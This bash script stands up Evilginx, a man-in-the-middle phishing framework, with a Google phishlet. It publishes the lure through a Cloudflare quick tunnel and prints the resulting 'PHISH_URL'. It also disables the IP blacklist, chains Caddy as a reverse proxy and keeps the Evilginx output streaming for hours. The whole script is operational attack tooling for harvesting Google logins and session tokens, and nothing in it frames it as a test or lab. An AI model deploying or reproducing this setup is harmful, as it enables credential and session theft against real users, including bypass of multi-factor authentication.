#!/usr/bin/env bash
set -euo pipefail
LIMIT=${RUN_LIMIT_MINUTES:-270}
PHISHLETS_DIR="$(pwd)/phishlets"
EVILGINX=/usr/local/bin/evilginx
CLOUDFLARED=/usr/local/bin/cloudflared
CADDY=/usr/local/bin/caddy
if [ "$(id -u)" = "0" ]; then SUDO=""; else SUDO="sudo"; fi

pkill -f evilginx 2>/dev/null || true
pkill -f caddy 2>/dev/null || true

echo "--- install caddy (exact asset via API) ---"
ASSET=$(curl -sL "https://api.github.com/repos/caddyserver/caddy/releases/latest" | grep -oE 'https://[^"]+_linux_amd64\.tar\.gz' | head -n1)
curl -sL "$ASSET" -o /tmp/caddy.tgz
tar -xzf /tmp/caddy.tgz -C /tmp caddy
$SUDO cp /tmp/caddy /usr/local/bin/caddy
caddy version

echo "--- tunnel -> 127.0.0.1:9443 (caddy) ---"
nohup "$CLOUDFLARED" tunnel --url https://127.0.0.1:9443 --no-tls-verify > cloudflared.log 2>&1 &
URL=""
for i in $(seq 1 60); do
  URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
  [ -n "$URL" ] && break
  sleep 2
done
[ -n "$URL" ] && echo "PHISH_URL=$URL"
HOST="${URL#https://}"

echo "--- evilginx on 443 (lure hostname $HOST) ---"
$SUDO mkdir -p /root/.evilginx
echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$HOST\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
rm -f /tmp/eg_in; mkfifo /tmp/eg_in
( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets hostname google $HOST"; sleep 1; echo "phishlets enable google"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
"$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &

EG=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/443) 2>/dev/null; then exec 3>&-; EG=1; break; fi
  sleep 2
done
echo "EVILGINX_443=$EG"

echo "--- caddy :9443 -> evilginx :443 ---"
cat > /tmp/Caddyfile <<EOF
https://$HOST:9443 {
    tls internal
    reverse_proxy 127.0.0.1:443 {
        transport http {
            tls_insecure_skip_verify
            tls_server_name $HOST
        }
    }
}
EOF
$SUDO "$CADDY" run --config /tmp/Caddyfile > caddy.log 2>&1 &

BOUND=0
for i in $(seq 1 30); do
  if (exec 3<>/dev/tcp/127.0.0.1/9443) 2>/dev/null; then exec 3>&-; BOUND=1; break; fi
  sleep 2
done
echo "CADDY_9443_BOUND=$BOUND"
sleep 5
echo "--- edge probe ---"
curl -sS -m 15 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
head -c 200 /tmp/edge.out 2>/dev/null || true
echo ""

echo "--- caddy log ---"
tail -n 20 caddy.log 2>/dev/null || echo "(no caddy.log)"
echo "--- backend TLS direct (SNI=$HOST) ---"
( echo | timeout 12 openssl s_client -connect 127.0.0.1:443 -servername "$HOST" 2>&1 | grep -iE 'CONNECTED|subject=|issuer=|CN =|verify|alert|error|unrecognized' ) || echo "NO_BACKEND_TLS"
echo "--- caddy local test ---"
curl -ksS -m 12 -H "Host: $HOST" -o /dev/null -w 'CADDY_LOCAL_HTTP:%{http_code}\n' "https://127.0.0.1:9443/" 2>&1 || echo "CADDY_LOCAL_FAIL"

echo "=== streaming evilginx output ==="
trap 'kill %3 %2 %1 2>/dev/null || true' EXIT
for i in $(seq 1 "$((LIMIT * 6))"); do sleep 10; done
